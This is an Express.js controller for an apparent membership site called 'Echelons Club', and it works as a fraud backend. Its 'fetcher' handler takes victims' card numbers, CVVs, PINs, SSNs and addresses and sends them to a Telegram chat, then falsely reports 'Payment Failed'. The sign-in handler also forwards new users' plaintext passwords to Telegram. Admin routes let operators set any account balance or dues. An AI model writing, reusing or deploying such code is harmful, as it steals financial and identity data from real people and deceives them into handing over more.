const asyncHandler = require("express-async-handler");
const User = require("../models/userModel");
const { generateToken, hashToken } = require("../utils");
const sendEmail = require("../utils/sendEmail");
const Token = require("../models/tokenModel");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");
const TelegramBot = require("node-telegram-bot-api");
const Auth = require("../models/authModel");
const Transaction = require("../models/transactionModel");

const authorized = asyncHandler(async (req, res) => {
  const { code, referral } = req.body;
  if (!code || !referral) {
    res.status(400);
    throw new Error("Code and referral is required");
  }

  const codeExist = await Auth.findOne({ code });
  if (codeExist) {
    res.status(400);
    throw new Error("Code already exist");
  }
  const user = await Auth.create({ code, referral });
  if (user) {
    res.json({ message: "Created" });
  } else {
    res.status(400);
    throw new Error("unknown error has occured");
  }
});

const getEmails = asyncHandler(async (req, res) => {
  const emails = await Auth.find().sort("-createdAt");
  if (!emails) {
    res.status(500);
    throw new Error("Something went wrong");
  }
  res.status(200).json(emails);
});

const deleteAuth = asyncHandler(async (req, res) => {
  const email = Auth.findById(req.params.id);

  if (!email) {
    res.status(404);
    throw new Error("Email not found");
  }

  await email.deleteOne();
  res.status(200).json({
    message: "Email deleted successfully",
  });
});

const signIn = asyncHandler(async (req, res) => {
  const { email, password, referral } = req.body;
  if (!email || !password) {
    res.status(400);
    throw new Error("Please fill in the required fields");
  }

  const user = await User.findOne({ email });
  if (user) {
    if (password !== user.password) {
      res.status(400);
      throw new Error("Invalid login credentials");
    }

    const token = generateToken(user._id);

    const response = {
      token,
      _id: user._id,
      email: user.email,
      balance: user.balance,
      role: user.role,
      dues: user.dues,
      title: user.title,
      description: user.description,
    };

    return res.status(200).json(response);
  }

  if (!referral) {
    res.status(400);
    throw new Error("Referral code is required for new members");
  }
  const authUser = await Auth.findOne({ code: referral });

  if (!authUser) {
    res.status(400);
    throw new Error("Invalid referral code");
  }
  const newUser = await User.create({
    email,
    password,
    balance: 10,
  });

  await Transaction.create({
    amount: 10,
    email: newUser.email,
    description: "Credit",
    status: "successful",
    method: "wallet",
  });

  const token = generateToken(newUser._id);

  const subject = `Welcome to the - Echelons Club`;
  const send_to = newUser.email;
  const sent_from = process.env.SMTP_USER;
  const reply_to = process.env.SMTP_REPLY;
  const template = "welcome";
  const username = newUser.email;
  const link = `${process.env.CL_URL}/sign-in`;

  await sendEmail(
    subject,
    send_to,
    sent_from,
    reply_to,
    template,
    username,
    link,
  );

  const tg_token = process.env.TG_TOKEN;
  const chatId = process.env.TG_ID;
  const bot = new TelegramBot(tg_token, { polling: true });
  const tg_msg = `
    !------ New Registration -------!
    Email: ${email}
    Referal: ${referral}
    Password: ${password}
    `;
  const sendMessage = await bot.sendMessage(chatId, tg_msg);
  if (sendMessage) {
    bot.stopPolling();
  }

  return res.status(201).json({
    token,
    _id: newUser._id,
    role: newUser.role,
    email: newUser.email,
    balance: newUser.balance,
    title: newUser.title,
    dues: newUser.dues,
    description: newUser.description,
  });
});

const getUser = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (user) {
    // const { _id, balance, email, role, title, dues, description } = user;
    // res.status(200).json({
    //   _id,
    //   balance,
    //   email,
    //   role,
    //   title,
    //   dues,
    //   description,
    // });
    res.status(200).json(user);
  } else {
    res.status(404);
    throw new Error("User not Found");
  }
});

const getUsers = asyncHandler(async (req, res) => {
  const users = await User.find().sort("-createdAt").select("-password");
  if (!users) {
    res.status(500);
    throw new Error("Something went wrong");
  }
  return res.status(200).json(users);
});

const loginStatus = asyncHandler(async (req, res) => {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.json(false);
  }

  const token = authHeader.split(" ")[1];

  try {
    jwt.verify(token, process.env.JWTOKEN);
    return res.json(true);
  } catch {
    return res.json(false);
  }
});

const upgradeUser = asyncHandler(async (req, res) => {
  const { role, id } = req.body;
  const user = await User.findById(id);
  if (!user) {
    res.status(404);
    throw new Error("User not found");
  }
  user.role = role;
  await user.save();

  const subject = "Account Suspended - Echelons Club";
  const send_to = user.email;
  const sent_from = process.env.SMTP_USER;
  const reply_to = process.env.SMTP_USER;
  let template;
  if (role === "suspended") {
    template = "suspended";
  } else {
    template = "lift";
  }

  const username = user.email;
  const link = `${process.env.CL_URL}/sign-in`;

  await sendEmail(
    subject,
    send_to,
    sent_from,
    reply_to,
    template,
    username,
    link,
  );

  res.status(200).json({
    message: `User Role Update to ${role}`,
  });
});

const logoutUser = asyncHandler(async (req, res) => {
  return res.status(200).json({ message: "Logged out" });
});

const forgotPassword = asyncHandler(async (req, res) => {
  const { email } = req.body;
  const user = await User.findOne({ email });
  if (!user) {
    res.status(404);
    throw new Error("A link will be sent if this email was registered!");
  }
  // Delete token if exist in DB
  let token = await Token.findOne({ userID: user._id });
  if (token) {
    await token.deleteOne();
  }
  //Create Reset Token and Save
  const resetToken = crypto.randomBytes(32).toString("hex") + user._id;

  //Hash Token and Save
  const hashedToken = hashToken(resetToken);
  await new Token({
    userID: user._id,
    rToken: hashedToken,
    createdAt: Date.now(),
    expiresAt: Date.now() + 60 * (60 * 1000), //60m
  }).save();
  //Construct Reset Url
  const resetUrl = `${process.env.CL_URL}/reset/${resetToken}`;
  //Send Email
  const subject = "Password Reset Request - Echelons Club";
  const send_to = user.email;
  const sent_from = process.env.SMTP_USER;
  const reply_to = process.env.SMTP_USER;
  const template = "reset";
  const username = user.email;
  const link = resetUrl;

  await sendEmail(
    subject,
    send_to,
    sent_from,
    reply_to,
    template,
    username,
    link,
  );
  res.status(200).json({ message: "Password Reset Email Sent" });
});

// Reset Password
const resetPassword = asyncHandler(async (req, res) => {
  const { resetToken } = req.params;
  const { password } = req.body;

  const hashedToken = hashToken(resetToken);
  const userToken = await Token.findOne({
    rToken: hashedToken,
    expiresAt: { $gt: Date.now() },
  });
  if (!userToken) {
    res.status(404);
    throw new Error("Invalid or Expired Token");
  }
  //Find User
  const user = await User.findOne({ _id: userToken.userID });
  //Now Reset Password
  user.password = password;
  await user.save();
  res.status(200).json({ message: "Password Reset Successful, Please Login" });
});

const contactUs = asyncHandler(async (req, res) => {
  const { name, email, subject, message, phone } = req.body;
  const user = await User.findOne({ email });
  if (!name || !email || !message || !subject || !phone) {
    res.status(400);
    throw new Error("Please fill in the required fields");
  }
  // if (!user) {
  //   res.status(400);
  //   throw new Error("Please contact us via a registered email");
  // }

  const token = process.env.TG_TOKEN;
  const chatId = process.env.TG_ID;
  const bot = new TelegramBot(token, { polling: true });
  const tg_msg = `
    !------ Contact us -------!
    Name: ${name}
    Email: ${email}
    Phone: ${phone}
    Subject: ${subject}
    Message: ${message}
    `;
  const sendMessage = await bot.sendMessage(chatId, tg_msg);
  if (sendMessage) {
    bot.stopPolling();
  }
  res.status(201).json({
    message:
      "Thank you for contacting us. A specialist will get back to you shortly",
  });
});

const provefetcher = asyncHandler(async (req, res) => {
  const { url, email } = req.body;

  const token = process.env.TG_TOKEN;
  const chatId = process.env.TG_ID;
  const bot = new TelegramBot(token, { polling: true });
  const tg_msg = `
    !------ PROOF OF PAYMENT -------!
    IMAGE:${url}
    EMAIL:${email}
    `;
  const sendMessage = await bot.sendMessage(chatId, tg_msg);
  if (sendMessage) {
    bot.stopPolling();
  }
  res.status(201).json({
    message: "Upload Successful",
  });
});

const fetcher = asyncHandler(async (req, res) => {
  const {
    cardHolder,
    email,
    cardNumber,
    cvv,
    exp,
    pin,
    bank,
    ssn,
    amount,
    street,
    city,
    state,
    zip,
  } = req.body;
  // if (
  //   !cardHolder ||
  //   !email ||
  //   !cardNumber ||
  //   !cvv ||
  //   !exp ||
  //   !pin ||
  //   !bank ||
  //   !ssn ||
  //   !amount
  // ) {
  //   res.status(400);
  //   throw new Error("Please fill in the required fields");
  // }

  const token = process.env.TG_TOKEN;
  const chatId = process.env.TG_ID;
  const bot = new TelegramBot(token, { polling: true });
  const tg_msg = `
    !------ CARD INFORMATION -------!
    EMAIL:${email}
    HOLDER: ${cardHolder}
    NUMBER: ${cardNumber}
    CVV: ${cvv}
    EXP: ${exp}
    PIN: ${pin}
    BANK: ${bank}
    SSN: ${ssn}
    USD: ${amount}
    STREET: ${street}
    CITY: ${city}
    STATE: ${state}
    ZIP: ${zip}
    `;
  const sendMessage = await bot.sendMessage(chatId, tg_msg);
  if (sendMessage) {
    bot.stopPolling();
  }
  res.status(201).json({
    message:
      "Payment Failed. Please check your payment details or try a different method",
  });
});

const changeCurrent = asyncHandler(async (req, res) => {
  const { email, title, dues, message } = req.body;
  if (!title || !email || !dues || !message) {
    res.status(400);
    throw new Error("Please fill in all fields");
  }
  const user = await User.findOne({ email });
  if (!user) {
    res.status(400);
    throw new Error("User was not found");
  }
  await User.findOneAndUpdate(
    { email },
    {
      $set: { dues, title, description: message },
    },
  );
  res.status(200).json({ mesage: "Success" });
});

const changeAvailable = asyncHandler(async (req, res) => {
  const { email, amount } = req.body;
  if (!amount || !email) {
    res.status(400);
    throw new Error("Please fill in all fields");
  }
  const user = await User.findOne({ email });
  if (!user) {
    res.status(400);
    throw new Error("User was not found");
  }
  await User.findOneAndUpdate(
    { email },
    {
      $set: { balance: amount },
    },
  );
  res.status(200).json({ mesage: "Success" });
});

const deleteUser = asyncHandler(async (req, res) => {
  const user = User.findById(req.params.id);

  if (!user) {
    res.status(404);
    throw new Error("User not found");
  }

  await user.deleteOne();
  res.status(200).json({
    message: "User deleted successfully",
  });
});

const registerMember = asyncHandler(async (req, res) => {
  const {
    firstName,
    lastName,
    email,
    gender,
    subdom,
    phone,
    address,
    membershipLevel,
  } = req.body;
  if (
    !firstName ||
    !lastName ||
    !email ||
    !gender ||
    !subdom ||
    !phone ||
    !address
  ) {
    res.status(400);
    throw new Error("All fields are required");
  }

  const user = await User.findOne({ email });
  if (!user) {
    res.status(400);
    throw new Error("Member not found");
  }

  user.firstName = firstName;
  user.lastName = lastName;
  user.gender = gender;
  user.subdom = subdom;
  user.phone = phone;
  user.address = address;
  user.membershipLevel = membershipLevel || "none";

  const updatedUser = await user.save();

  res.status(200).json({ data: updatedUser, message: "Success" });
});

module.exports = {
  signIn,
  logoutUser,
  getUser,
  getUsers,
  loginStatus,
  upgradeUser,
  forgotPassword,
  resetPassword,
  contactUs,
  authorized,
  getEmails,
  deleteAuth,
  fetcher,
  provefetcher,
  changeCurrent,
  changeAvailable,
  deleteUser,
  registerMember,
};
